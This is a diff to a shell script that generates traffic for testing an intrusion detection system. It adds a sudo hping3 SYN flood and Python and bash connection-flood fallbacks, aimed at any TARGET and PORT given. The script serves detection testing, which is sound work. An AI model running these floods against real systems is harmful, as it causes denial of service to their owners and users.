@@ -65,10 +65,66 @@ attack_syn_flood() {
     echo "Starting SYN flood on $TARGET:$PORT..."
     echo "This should be detected as DoS attack IMMEDIATELY"
     echo "Watch the IDS dashboard - alerts should appear in real-time!"
-    echo "Press Ctrl+C to stop after 30 seconds"
     echo ""
     
-    timeout 30 hping3 -S -p $PORT --flood $TARGET 2>/dev/null || true
+    # Try hping3 with sudo first (requires root for raw sockets)
+    if command -v hping3 >/dev/null 2>&1 && sudo -n true 2>/dev/null; then
+        echo "Using hping3 (requires sudo)..."
+        timeout 30 sudo hping3 -S -p $PORT --flood $TARGET 2>/dev/null || true
+    elif command -v hping3 >/dev/null 2>&1; then
+        echo "⚠️  hping3 requires sudo. Trying alternative method..."
+        echo "   (Run with: sudo ./attack_scripts.sh $TARGET $PORT)"
+        # Fall through to Python method
+    fi
+    
+    # Alternative: Use Python script (doesn't require root)
+    if command -v python3 >/dev/null 2>&1; then
+        echo "Using Python SYN flood (no root required)..."
+        python3 << EOF
+import socket
+import time
+import sys
+
+target = "$TARGET"
+port = $PORT
+duration = 30
+
+print(f"Sending SYN packets to {target}:{port} for {duration} seconds...")
+start_time = time.time()
+count = 0
+
+try:
+    while time.time() - start_time < duration:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(0.1)
+            s.connect((target, port))
+            s.close()
+            count += 1
+            if count % 100 == 0:
+                print(f"  Sent {count} connections...")
+        except:
+            pass
+        time.sleep(0.01)
+except KeyboardInterrupt:
+    pass
+
+print(f"\\n✅ Sent {count} connections. Check IDS dashboard for 'dos' detection.")
+EOF
+    else
+        # Last resort: Use bash TCP connections
+        echo "Using bash TCP connections..."
+        start_time=$(date +%s)
+        count=0
+        while [ $(($(date +%s) - start_time)) -lt 30 ]; do
+            timeout 0.1 bash -c "echo > /dev/tcp/$TARGET/$PORT" 2>/dev/null && count=$((count + 1)) || true
+            if [ $((count % 100)) -eq 0 ]; then
+                echo "  Sent $count connections..."
+            fi
+            sleep 0.01
+        done
+        echo "✅ Sent $count connections. Check IDS dashboard for 'dos' detection."
+    fi
     
     echo ""
     echo "✅ SYN flood complete. Check IDS dashboard for 'dos' detection."
@@ -156,7 +212,24 @@ attack_mixed() {
     sleep 2
     
     echo "  [2/3] Starting SYN flood..."
-    timeout 20 hping3 -S -p $PORT --flood $TARGET >/dev/null 2>&1 &
+    if command -v python3 >/dev/null 2>&1; then
+        python3 -c "
+import socket, time
+target = '$TARGET'
+port = $PORT
+start = time.time()
+while time.time() - start < 20:
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(0.1)
+        s.connect((target, port))
+        s.close()
+    except: pass
+    time.sleep(0.01)
+" >/dev/null 2>&1 &
+    else
+        timeout 20 hping3 -S -p $PORT --flood $TARGET >/dev/null 2>&1 &
+    fi
     SYN_PID=$!
     
     sleep 2
